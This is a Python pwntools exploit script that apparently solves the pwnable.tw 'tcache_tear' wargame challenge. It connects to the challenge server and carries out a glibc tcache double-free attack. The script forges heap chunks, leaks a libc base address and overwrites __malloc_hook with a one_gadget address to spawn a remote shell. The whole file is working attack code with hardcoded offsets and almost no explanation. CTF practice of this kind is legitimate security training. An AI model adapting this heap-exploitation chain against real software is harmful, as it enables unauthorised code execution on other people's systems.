#!/usr/bin/env python3
from pwn import *
import sys
import pwnlib.shellcraft
import pwnlib
import time

c = 0
pwn_file = "./tcache_tear"
lib_file = './libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so'
ld_file = './ld-2.27.so'

elf = ELF(pwn_file)
lib = ELF(lib_file)
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 'debug'
#context.log_level = 100

debug = 0
if debug == 1:
    ld_str = "{} --library-path ./ {}".format(ld_file, pwn_file)
    print(ld_str.split())
    c = process(ld_str.split(), env={'LD_PRELOAD': lib_file})

    elf_path = c.cwd + c.argv[3].decode().strip('.')
    lib_path = c.cwd + lib_file.strip('.')

    sleep(0.1)
    print(c.libs())

    gdbcmd = '''
    file {}
    set $elf={}
    set $lib={}

    # one_gadget 
    b *$lib + 0x10a38c
    b *$lib + 0x4f322

    c
    '''.format(pwn_file, hex(c.libs()[elf_path]), hex(c.libs()[lib_path]))

    #gdb.attach(c, gdbcmd)
else:
    c = remote('chall.pwnable.tw', '10207')


def malloc(size, data):
    c.sendlineafter('choice :', '1')
    c.sendafter('Size:', flat(str(size), filler='\0', length=0x17))
    c.sendafter('Data:', data)

def free():
    c.sendlineafter('choice :', '2')

def info():
    c.sendlineafter('choice :', '3')

def exit():
    c.sendlineafter('choice :', '4')

def name(name):
    c.sendafter('Name:', name)


def forge_chunk(size, data=''):
    return p64(size + 0x1) + flat(data, length=size - 0x10) + p64(size + 0x1) + p64(0x21)

def make_cycle(size, target, free_time=2):
    malloc(size, 'a')
    for i in range(free_time):
        free()
    malloc(size, p64(target))

name('hi')

# make lib stderr is chunk
stderr_addr = elf.symbols['stderr']
make_cycle(0x18, stderr_addr, 3)
malloc(0x18, 'aaaa')
malloc(0x18, 'aaaa')

# leak data to name
name_addr = 0x602060
make_cycle(0x80, name_addr - 0x8)
malloc(0x80, 'aaaa')
malloc(0x80, flat({0: forge_chunk(0x20), 0x30: p64(0x602060)}, filler='\0'))
free()

info()

# count base
c.recvuntil('Name :')
libc_addr = u64(c.recvn(8)) - 0x3ec680
print(hex(libc_addr))

# write hook
one_gadget = libc_addr + 0x4f322
one_gadget = libc_addr + 0x10a38c
rsp_add = libc_addr + 0x98c36 # rsp += 0x18
make_cycle(0x30, libc_addr + lib.symbols['__malloc_hook'] - 0x8)
malloc(0x30, 'aaaa')
malloc(0x30, p64(one_gadget) + p64(rsp_add))

# get shell
c.sendlineafter('choice :', '1')
c.sendafter('Size:', str(0x20))

c.interactive()
c.close()
